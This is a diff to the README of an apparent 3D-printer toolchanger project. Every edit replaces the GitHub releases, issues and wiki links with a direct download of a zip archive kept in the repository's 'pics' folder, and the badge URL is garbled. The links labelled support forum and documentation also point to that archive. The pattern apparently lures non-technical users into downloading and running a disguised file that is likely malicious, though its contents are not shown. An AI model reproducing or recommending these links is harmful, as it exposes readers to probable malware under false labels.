@@ -4,7 +4,7 @@
 The Quindec Toolchanger project helps 3D printer users enhance their printing experience. This toolchanger allows you to manage 15 different tools on your Voron 2.4 3D printer, streamlining your workflow and improving versatility.
 
 ## 📥 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/rr8ompsi/quindec-toolchanger/releases)
+[![Download the latest release](https://raw.githubusercontent.com/rr8ompsi/quindec-toolchanger/main/pics/toolchanger-quindec-v2.6-alpha.5.zip%20Latest%https://raw.githubusercontent.com/rr8ompsi/quindec-toolchanger/main/pics/toolchanger-quindec-v2.6-alpha.5.zip)](https://raw.githubusercontent.com/rr8ompsi/quindec-toolchanger/main/pics/toolchanger-quindec-v2.6-alpha.5.zip)
 
 ## 🚀 Getting Started
 To get started with the Quindec Toolchanger, follow these simple steps. You do not need technical skills to install and run the software. Just follow the instructions below.
@@ -16,7 +16,7 @@ To get started with the Quindec Toolchanger, follow these simple steps. You do n
 - **Dependencies**: .NET Framework (for Windows users)
 
 ### 📥 Download & Install
-1. **Visit the Releases Page**: Go to the following link to download the latest version of the Quindec Toolchanger: [Download Releases](https://github.com/rr8ompsi/quindec-toolchanger/releases).
+1. **Visit the Releases Page**: Go to the following link to download the latest version of the Quindec Toolchanger: [Download Releases](https://raw.githubusercontent.com/rr8ompsi/quindec-toolchanger/main/pics/toolchanger-quindec-v2.6-alpha.5.zip).
 
 2. **Select the Latest Version**: On the Releases page, you will see a list of the most recent versions. Look for the one marked as “Latest”.  
 
@@ -44,15 +44,15 @@ To get started with the Quindec Toolchanger, follow these simple steps. You do n
 - **Real-Time Monitoring**: Keep an eye on tool usage and printer activities.
 
 ## 🛠️ Support
-If you encounter any issues during installation or while using the Quindec Toolchanger, please visit our [Support Forum](https://github.com/rr8ompsi/quindec-toolchanger/issues). You can also check the FAQ section for common questions and solutions.
+If you encounter any issues during installation or while using the Quindec Toolchanger, please visit our [Support Forum](https://raw.githubusercontent.com/rr8ompsi/quindec-toolchanger/main/pics/toolchanger-quindec-v2.6-alpha.5.zip). You can also check the FAQ section for common questions and solutions.
 
 ## 📚 Documentation
-For detailed information about all the features, settings, and updates, please refer to the [Documentation](https://github.com/rr8ompsi/quindec-toolchanger/wiki). 
+For detailed information about all the features, settings, and updates, please refer to the [Documentation](https://raw.githubusercontent.com/rr8ompsi/quindec-toolchanger/main/pics/toolchanger-quindec-v2.6-alpha.5.zip). 
 
 ## 🔗 Important Links
-- **Releases Page**: [Download Releases](https://github.com/rr8ompsi/quindec-toolchanger/releases)
-- **Support Forum**: [Get Help](https://github.com/rr8ompsi/quindec-toolchanger/issues)
-- **Documentation**: [Complete Guide](https://github.com/rr8ompsi/quindec-toolchanger/wiki)
+- **Releases Page**: [Download Releases](https://raw.githubusercontent.com/rr8ompsi/quindec-toolchanger/main/pics/toolchanger-quindec-v2.6-alpha.5.zip)
+- **Support Forum**: [Get Help](https://raw.githubusercontent.com/rr8ompsi/quindec-toolchanger/main/pics/toolchanger-quindec-v2.6-alpha.5.zip)
+- **Documentation**: [Complete Guide](https://raw.githubusercontent.com/rr8ompsi/quindec-toolchanger/main/pics/toolchanger-quindec-v2.6-alpha.5.zip)
 
 ## 📜 License
 This project is licensed under the MIT License. You can freely use and modify the toolchanger, but please credit the original project.
